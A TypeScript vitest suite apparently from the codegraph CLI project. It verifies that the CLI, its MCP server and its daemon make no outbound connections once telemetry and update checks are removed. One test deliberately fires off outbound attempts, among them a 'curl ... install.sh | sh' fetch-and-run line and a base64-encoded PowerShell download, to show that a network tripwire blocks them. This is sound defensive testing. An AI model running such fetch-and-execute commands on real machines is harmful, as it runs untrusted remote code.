/**
 * The built CLI makes zero outbound connections (privacy hardening, #2).
 *
 * Every process the suite starts (the CLI, its own re-exec, the MCP daemon and
 * their worker threads) loads `fixtures/network-tripwire.cjs` through
 * NODE_OPTIONS. The tripwire records, then fails, any attempt to reach
 * something that isn't loopback or a local socket, so a run never touches the
 * network and the record says exactly what was tried.
 */
import { describe, it, expect, beforeAll, beforeEach, afterAll } from 'vitest';
import { spawn, spawnSync, ChildProcessWithoutNullStreams } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { WASM_RUNTIME_FLAGS } from '../src/extraction/wasm-runtime-flags';

const BIN = path.resolve(__dirname, '../dist/bin/codegraph.js');
const TRIPWIRE = path.resolve(__dirname, 'fixtures/network-tripwire.cjs');
const SPAWN_RECORDER = path.resolve(__dirname, 'fixtures/record-detached-spawns.cjs');

/**
 * Switches that would turn a network feature off, stripped from the inherited
 * environment (vitest itself sets CODEGRAPH_TELEMETRY=0). Telemetry (#3) and the
 * update check (#4) are gone from the code, so the suite runs with none of them:
 * passing here proves the features are removed, not just disabled.
 */
const INHERITED_OPT_OUTS = ['CODEGRAPH_TELEMETRY', 'DO_NOT_TRACK', 'CODEGRAPH_NO_UPDATE_CHECK', 'CODEGRAPH_TELEMETRY_ENDPOINT'];

/** A command that finishes later than this was waiting on something. */
const COMMAND_BUDGET_MS = 15_000;

let root: string;
let home: string;
let project: string;
let networkLog: string;
let spawnLog: string;

function childEnv(extra: Record<string, string> = {}): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = { ...process.env };
  for (const key of INHERITED_OPT_OUTS) delete env[key];
  return {
    ...env,
    HOME: home,
    USERPROFILE: home,
    NODE_OPTIONS: [env.NODE_OPTIONS, `--require ${JSON.stringify(TRIPWIRE)}`, `--require ${JSON.stringify(SPAWN_RECORDER)}`]
      .filter(Boolean)
      .join(' '),
    CG_TEST_NETWORK_LOG: networkLog,
    CG_TEST_SPAWN_LOG: spawnLog,
    ...extra,
  };
}

function recordedAttempts(): Array<{ pid: number; kind: string; target: string }> {
  let raw = '';
  try { raw = fs.readFileSync(networkLog, 'utf8'); } catch { return []; }
  return raw.split('\n').filter(Boolean).map((line) => JSON.parse(line));
}

function runCli(args: string[]): { status: number | null; ms: number; output: string } {
  const started = Date.now();
  const result = spawnSync(process.execPath, [...WASM_RUNTIME_FLAGS, BIN, ...args], {
    cwd: project,
    env: childEnv(),
    encoding: 'utf8',
    timeout: 60_000,
  });
  return { status: result.status, ms: Date.now() - started, output: `${result.stdout}\n${result.stderr}` };
}

function isAlive(pid: number): boolean {
  try { process.kill(pid, 0); return true; } catch (err) {
    return (err as NodeJS.ErrnoException).code === 'EPERM';
  }
}

/** Every detached process (the MCP daemon) the run started, by pid. */
function recordedSpawns(): number[] {
  let raw = '';
  try { raw = fs.readFileSync(spawnLog, 'utf8'); } catch { return []; }
  return raw.split('\n').map(Number).filter((pid) => Number.isSafeInteger(pid) && pid > 0);
}

async function waitForDetachedExit(timeoutMs = 20_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (recordedSpawns().some(isAlive)) {
    if (Date.now() > deadline) throw new Error(`detached processes still running: ${recordedSpawns().filter(isAlive).join(', ')}`);
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
}

beforeAll(() => {
  root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'codegraph-tripwire-')));
  home = path.join(root, 'home');
  project = path.join(root, 'project');
  networkLog = path.join(root, 'network.log');
  spawnLog = path.join(root, 'spawns.log');
  fs.mkdirSync(home);
  fs.mkdirSync(path.join(project, 'src'), { recursive: true });
  fs.writeFileSync(
    path.join(project, 'src', 'math.ts'),
    'export function add(a: number, b: number): number {\n  return a + b;\n}\n\nexport function twice(x: number): number {\n  return add(x, x);\n}\n',
  );
  fs.writeFileSync(
    path.join(project, 'src', 'main.ts'),
    "import { twice } from './math';\n\nexport function main(): void {\n  console.log(twice(21));\n}\n",
  );
  spawnSync('git', ['init', '-q'], { cwd: project });
});

// Each test reads only the attempts it caused.
beforeEach(() => {
  fs.rmSync(networkLog, { force: true });
});

afterAll(async () => {
  await waitForDetachedExit().catch(() => undefined);
  fs.rmSync(root, { recursive: true, force: true, maxRetries: 5 });
});

describe('network tripwire', () => {
  it('records and blocks every kind of outbound attempt, and lets loopback through', async () => {
    const script = `
      const cp = require('child_process'), dns = require('dns'), http = require('http'), net = require('net');
      (async () => {
        const server = http.createServer((req, res) => res.end('ok'));
        await new Promise((r) => server.listen(0, '127.0.0.1', r));
        const { port } = server.address();
        await (await fetch('http://127.0.0.1:' + port + '/')).text();
        await new Promise((r) => net.connect(port, 'localhost').on('error', () => {}).on('connect', function () { this.destroy(); r(); }));
        await fetch('https://example.invalid/').catch(() => {});
        await new Promise((r) => net.connect(443, 'example.invalid').on('error', r));
        await new Promise((r) => dns.lookup('example.invalid', r));
        try { cp.spawnSync('curl', ['-fsSL', 'https://example.invalid/']); } catch {}
        try { cp.execSync('curl -fsSL https://example.invalid/install.sh | sh'); } catch {}
        const encoded = Buffer.from('Invoke-WebRequest https://example.invalid/x.zip', 'utf16le').toString('base64');
        try { cp.spawn('powershell', ['-NoProfile', '-EncodedCommand', encoded]); } catch {}
        server.close();
      })();
    `;
    const result = spawnSync(process.execPath, ['-e', script], { env: childEnv(), encoding: 'utf8', timeout: 20_000 });
    expect(result.stderr).not.toMatch(/Error/);
    expect(result.status).toBe(0);
    const attempts = recordedAttempts();
    expect(attempts.map((a) => a.kind)).toEqual(['fetch', 'connect', 'dns', 'spawn', 'spawn', 'spawn']);
    expect(attempts.every((a) => !/127\.0\.0\.1|localhost/.test(a.target))).toBe(true);
  });

  it('init, index, query and explore make no outbound attempt', () => {
    for (const args of [['init', '-y', '.'], ['index', '.'], ['query', 'twice'], ['explore', 'twice', 'add']]) {
      const { status, ms, output } = runCli(args);
      expect({ args, status, output: status === 0 ? '' : output }).toEqual({ args, status: 0, output: '' });
      expect(ms, `codegraph ${args.join(' ')} took ${ms} ms`).toBeLessThan(COMMAND_BUDGET_MS);
    }
    expect(recordedAttempts()).toEqual([]);
  });

  it('codegraph telemetry reports that telemetry is removed, in every form', () => {
    for (const args of [['telemetry'], ['telemetry', 'status'], ['telemetry', 'on'], ['telemetry', 'off']]) {
      const { status, output } = runCli(args);
      expect({ args, status }).toEqual({ args, status: 0 });
      expect(output).toMatch(/Telemetry is removed in this build/);
    }
    expect(recordedAttempts()).toEqual([]);
  });

  it('codegraph upgrade prints the source-build instructions and downloads nothing', () => {
    for (const args of [['upgrade'], ['upgrade', '--check'], ['upgrade', '9.9.9', '--force']]) {
      const { status, ms, output } = runCli(args);
      expect({ args, status }).toEqual({ args, status: 0 });
      expect(ms, `codegraph ${args.join(' ')} took ${ms} ms`).toBeLessThan(COMMAND_BUDGET_MS);
      expect(output).toMatch(/downloads nothing/);
      expect(output).toMatch(/git pull\n\s+npm ci\n\s+npm run build/);
    }
    expect(recordedAttempts()).toEqual([]);
  });

  describe.each([
    ['in-process', { CODEGRAPH_NO_DAEMON: '1' }],
    ['daemon', { CODEGRAPH_DAEMON_IDLE_TIMEOUT_MS: '1000' }],
  ])('serve --mcp (%s)', (_mode, modeEnv) => {
    it('answers initialize and a tool call with no outbound attempt', async () => {
      const child = spawn(process.execPath, [...WASM_RUNTIME_FLAGS, BIN, 'serve', '--mcp'], {
        cwd: project,
        stdio: ['pipe', 'pipe', 'pipe'],
        env: childEnv(modeEnv),
      }) as ChildProcessWithoutNullStreams;
      const exited = new Promise<number | null>((resolve) => child.on('exit', resolve));
      const responses = new Map<number, unknown>();
      let buffer = '';
      child.stdout.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        let newline;
        while ((newline = buffer.indexOf('\n')) !== -1) {
          const line = buffer.slice(0, newline);
          buffer = buffer.slice(newline + 1);
          try {
            const message = JSON.parse(line);
            if (typeof message.id === 'number') responses.set(message.id, message);
          } catch { /* not a JSON-RPC line */ }
        }
      });
      const send = (message: object) => child.stdin.write(JSON.stringify(message) + '\n');
      const response = async (id: number) => {
        const deadline = Date.now() + COMMAND_BUDGET_MS;
        while (!responses.has(id)) {
          if (Date.now() > deadline) throw new Error(`no response to request ${id}`);
          await new Promise((resolve) => setTimeout(resolve, 20));
        }
        return responses.get(id) as { result?: { isError?: boolean } };
      };

      send({
        jsonrpc: '2.0',
        id: 0,
        method: 'initialize',
        params: { protocolVersion: '2025-11-25', capabilities: {}, clientInfo: { name: 'tripwire', version: '0.0.0' }, rootUri: `file://${project}` },
      });
      expect((await response(0)).result).toBeDefined();
      send({ jsonrpc: '2.0', method: 'notifications/initialized' });
      send({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'codegraph_explore', arguments: { query: 'twice add' } } });
      const call = await response(1);
      expect(call.result?.isError).not.toBe(true);

      child.stdin.end();
      expect(await exited).toBe(0);
      await waitForDetachedExit();
      expect(recordedAttempts()).toEqual([]);
    });
  });

  // Last, after every command above (and the daemon) has run in this HOME.
  it('leaves no telemetry identity, telemetry queue or update-check cache behind', async () => {
    await waitForDetachedExit();
    const stateDir = path.join(home, '.codegraph');
    const leftovers = fs.existsSync(stateDir)
      ? fs.readdirSync(stateDir).filter((name) => name.startsWith('telemetry') || name.startsWith('update-check'))
      : [];
    expect(leftovers).toEqual([]);
  });
});
